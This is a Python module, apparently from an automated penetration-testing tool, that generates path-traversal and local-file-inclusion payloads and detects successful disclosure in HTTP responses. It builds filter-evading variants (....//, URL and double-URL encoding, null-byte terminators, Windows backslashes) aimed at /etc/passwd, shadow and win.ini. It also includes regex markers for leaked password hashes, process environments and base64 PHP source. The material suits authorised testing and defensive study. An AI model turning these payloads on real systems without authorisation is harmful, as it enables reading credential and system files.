"""Shared utilities for LFI / path-traversal payload generation and detection.

Lives under ``penage/specialists/shared`` so multiple specialists can consume
it without the shared layer depending on ``penage.specialists.vulns`` (see
CLAUDE.md invariant #1).

Two responsibilities:

* :func:`generate_traversal_variants` — build a deduplicated list of
  path-traversal payloads (raw, URL-encoded, double-URL-encoded, ``....//``
  bypass, null-byte terminated, absolute, Windows backslash) for a known
  target file.
* :func:`detect_lfi_markers` — scan a response body for strong markers of
  successful file disclosure. Returns all hits so a single body containing
  e.g. both a ``/proc/self/status`` fragment and a ``php://filter`` base64
  block produces two hits for downstream triage.

Both functions are read-only: they perform no HTTP / filesystem I/O.
"""

from __future__ import annotations

import base64
import binascii
import re
from dataclasses import dataclass
from enum import Enum

_SNIPPET_MAX_CHARS = 200


class LfiTargetFamily(str, Enum):
    """Classes of sensitive files a disclosure might expose."""

    UNIX_PASSWD = "unix_passwd"
    UNIX_HOSTS = "unix_hosts"
    UNIX_SHADOW = "unix_shadow"
    WIN_HOSTS = "win_hosts"
    WIN_INI = "win_ini"
    PROC_SELF = "proc_self"
    LOG_FILE = "log_file"
    CODE_LEAK = "code_leak"


@dataclass(frozen=True, slots=True)
class LfiMarkerHit:
    """A single detected marker inside a response body.

    :param family: which file family the marker corresponds to.
    :param marker: the exact substring matched (not the whole snippet).
    :param snippet: up to 200 chars of surrounding context, useful for the
        validation gate and trace evidence (CLAUDE.md invariant #5).
    """

    family: LfiTargetFamily
    marker: str
    snippet: str


# ---------------------------------------------------------------------------
# Payload generation
# ---------------------------------------------------------------------------

_WIN_DRIVE_RE = re.compile(r"^[A-Za-z]:[\\/]?")


def _looks_like_windows_path(target: str) -> bool:
    return bool(_WIN_DRIVE_RE.match(target)) or "\\" in target


def _strip_drive_and_leading_sep(target: str) -> str:
    """Return the relative part of a path without leading sep or drive letter."""
    without_drive = _WIN_DRIVE_RE.sub("", target)
    return without_drive.lstrip("/\\")


def _url_encode_traversal(rel_fwd: str) -> str:
    """URL-encode the dots, slashes and backslashes of a relative path."""
    out: list[str] = []
    for ch in rel_fwd:
        if ch == "/":
            out.append("%2f")
        elif ch == "\\":
            out.append("%5c")
        elif ch == ".":
            out.append("%2e")
        else:
            out.append(ch)
    return "".join(out)


def _double_url_encode_traversal(rel_fwd: str) -> str:
    """Double-URL-encode the dots, slashes and backslashes of a relative path."""
    out: list[str] = []
    for ch in rel_fwd:
        if ch == "/":
            out.append("%252f")
        elif ch == "\\":
            out.append("%255c")
        elif ch == ".":
            out.append("%252e")
        else:
            out.append(ch)
    return "".join(out)


def generate_traversal_variants(
    target_path: str,
    *,
    max_depth: int = 8,
) -> list[str]:
    """Build path-traversal payloads for a known file path.

    The generated variants cover the common surface probed by LFI specialists:

    * raw ``../`` at depths ``3..max_depth``
    * ``....//`` filter-regex-evader at the same depths
    * URL-encoded (``%2e%2e%2f``) and double-URL-encoded (``%252e%252e%252f``)
      forms at the same depths
    * ``.\\./`` mixed-slash bypass
    * Absolute path without any traversal (``/etc/passwd``, ``C:\\Windows\\win.ini``)
    * Null-byte terminated variants (``%00`` and ``%00.jpg``) for old PHP
    * Windows backslash variants (``..\\..\\Windows\\win.ini``) when the
      ``target_path`` looks Windows-style

    The list is deduplicated while preserving insertion order so callers that
    enumerate it in order hit the cheapest bypasses first.

    :param target_path: canonical target (e.g. ``/etc/passwd`` or
        ``C:\\Windows\\win.ini``).
    :param max_depth: maximum number of ``../`` segments; must be >= 3.
    :returns: ordered, deduplicated list of traversal payload strings.
    """
    if max_depth < 3:
        raise ValueError(f"max_depth must be >= 3, got {max_depth}")

    is_windows = _looks_like_windows_path(target_path)
    rel_fwd = _strip_drive_and_leading_sep(target_path).replace("\\", "/")
    rel_bwd = rel_fwd.replace("/", "\\")

    enc_fwd = _url_encode_traversal(rel_fwd)
    enc_double_fwd = _double_url_encode_traversal(rel_fwd)

    depths = range(3, max_depth + 1)
    variants: list[str] = []

    # 1. Raw forward-slash traversal
    for d in depths:
        variants.append("../" * d + rel_fwd)

    # 2. ....// bypass (regex evader that strips ../ but not ..../)
    for d in depths:
        variants.append("....//" * d + rel_fwd)

    # 3. URL-encoded
    for d in depths:
        variants.append("%2e%2e%2f" * d + enc_fwd)

    # 4. Double-URL-encoded
    for d in depths:
        variants.append("%252e%252e%252f" * d + enc_double_fwd)

    # 5. Mixed .\./ bypass — alternates dot-backslash-dot-slash
    for d in depths:
        variants.append(".\\./" * d + rel_fwd)

    # 6. Absolute path, no traversal
    if is_windows:
        variants.append(target_path)
        variants.append("/" + rel_fwd)
    else:
        variants.append("/" + rel_fwd)

    # 7. Null-byte terminated variants (old PHP pre-5.3.4)
    for d in (3, max_depth):
        base = "../" * d + rel_fwd
        variants.append(base + "%00")
        variants.append(base + "%00.jpg")

    # 8. Windows backslash variants (only when target is Windows-style)
    if is_windows:
        for d in depths:
            variants.append("..\\" * d + rel_bwd)
        # Mixed slash hybrid: forward slashes for traversal, backslash for file
        variants.append("../" * 3 + rel_bwd)

    seen: set[str] = set()
    deduped: list[str] = []
    for v in variants:
        if v in seen:
            continue
        seen.add(v)
        deduped.append(v)
    return deduped


# ---------------------------------------------------------------------------
# Marker detection
# ---------------------------------------------------------------------------


def _snippet_around(body: str, start: int, end: int) -> str:
    """Return up to :data:`_SNIPPET_MAX_CHARS` of context around ``[start:end]``."""
    half = _SNIPPET_MAX_CHARS // 2
    s = max(0, start - half)
    e = min(len(body), end + half)
    snippet = body[s:e]
    if len(snippet) > _SNIPPET_MAX_CHARS:
        snippet = snippet[:_SNIPPET_MAX_CHARS]
    return snippet


_UNIX_PASSWD_RE = re.compile(r"root:x:0:0:[^:\n]*:/[^:\n]*:")
_UNIX_HOSTS_LINE_RE = re.compile(
    r"^[ \t]*127\.0\.0\.1[ \t]+[^\n]*\blocalhost\b[^\n]*$",
    re.MULTILINE,
)
_UNIX_SHADOW_RE = re.compile(r"root:\$[1256][ay]?\$[^\s:]+")
_WIN_HOSTS_MARKER_RE = re.compile(
    r"(?:Microsoft\s+(?:TCP/IP|Corp\.?)|This is a sample HOSTS file)",
    re.IGNORECASE,
)
_WIN_INI_SECTION_RE = re.compile(
    r"\[(?:fonts|extensions|mci extensions|files|Mail)\]",
    re.IGNORECASE,
)
_PROC_STATUS_RE = re.compile(r"^Name:[ \t][^\n]+\nState:[ \t]", re.MULTILINE)
_PROC_ENVIRON_RE = re.compile(r"(?:^|\x00)(?:PATH|HOME|USER|SHELL|PWD)=")
_LOG_LINE_RE = re.compile(
    r'"(?:GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH) /[^\s"]*\s+HTTP/\d\.\d"\s+\d{3}\s+\d+'
)
_BASE64_BLOCK_RE = re.compile(r"([A-Za-z0-9+/]{100,})={0,2}")
_PHP_TOKENS = (
    "<?php",
    "<?=",
    "function ",
    "$_GET",
    "$_POST",
    "$_SERVER",
    "$_REQUEST",
    "require(",
    "include(",
)


def _detect_unix_passwd(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _UNIX_PASSWD_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.UNIX_PASSWD,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_unix_hosts(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _UNIX_HOSTS_LINE_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.UNIX_HOSTS,
                marker=m.group(0).strip(),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_unix_shadow(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _UNIX_SHADOW_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.UNIX_SHADOW,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_win_hosts(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    if "127.0.0.1" not in body or "localhost" not in body:
        return hits
    for m in _WIN_HOSTS_MARKER_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.WIN_HOSTS,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_win_ini(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _WIN_INI_SECTION_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.WIN_INI,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _detect_proc_self(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _PROC_STATUS_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.PROC_SELF,
                marker=m.group(0).split("\n", 1)[0],
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    environ_tokens = 0
    first: re.Match[str] | None = None
    for m in _PROC_ENVIRON_RE.finditer(body):
        environ_tokens += 1
        if first is None:
            first = m
    if environ_tokens >= 2 and first is not None:
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.PROC_SELF,
                marker=first.group(0).lstrip("\x00"),
                snippet=_snippet_around(body, first.start(), first.end()),
            )
        )
    return hits


def _detect_log_file(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _LOG_LINE_RE.finditer(body):
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.LOG_FILE,
                marker=m.group(0),
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def _decode_base64_safely(block: str) -> str | None:
    sample = block[:300]
    padding = (-len(sample)) % 4
    sample_padded = sample + ("=" * padding)
    try:
        decoded = base64.b64decode(sample_padded, validate=True)
    except (binascii.Error, ValueError):
        return None
    try:
        return decoded.decode("utf-8", errors="ignore")
    except UnicodeDecodeError:
        return None


def _detect_code_leak(body: str) -> list[LfiMarkerHit]:
    hits: list[LfiMarkerHit] = []
    for m in _BASE64_BLOCK_RE.finditer(body):
        block = m.group(1)
        decoded = _decode_base64_safely(block)
        if decoded is None:
            continue
        if not any(tok in decoded for tok in _PHP_TOKENS):
            continue
        hits.append(
            LfiMarkerHit(
                family=LfiTargetFamily.CODE_LEAK,
                marker=block[:64],
                snippet=_snippet_around(body, m.start(), m.end()),
            )
        )
    return hits


def detect_lfi_markers(body: str) -> list[LfiMarkerHit]:
    """Scan ``body`` for strong markers of successful file disclosure.

    All detectors are run and all matches are returned — a single response
    can legitimately contain multiple family markers (e.g. a ``/etc/hosts``
    fragment plus a ``php://filter`` base64 block). The caller decides which
    hit is more interesting.

    An empty body (or a body with no detectable markers) returns an empty
    list; callers must not treat an empty return as a negative signal of LFI
    — only as a lack of strong evidence.
    """
    if not body:
        return []
    hits: list[LfiMarkerHit] = []
    hits.extend(_detect_unix_passwd(body))
    hits.extend(_detect_unix_hosts(body))
    hits.extend(_detect_unix_shadow(body))
    hits.extend(_detect_win_hosts(body))
    hits.extend(_detect_win_ini(body))
    hits.extend(_detect_proc_self(body))
    hits.extend(_detect_log_file(body))
    hits.extend(_detect_code_leak(body))
    return hits


__all__ = [
    "LfiMarkerHit",
    "LfiTargetFamily",
    "detect_lfi_markers",
    "generate_traversal_variants",
]
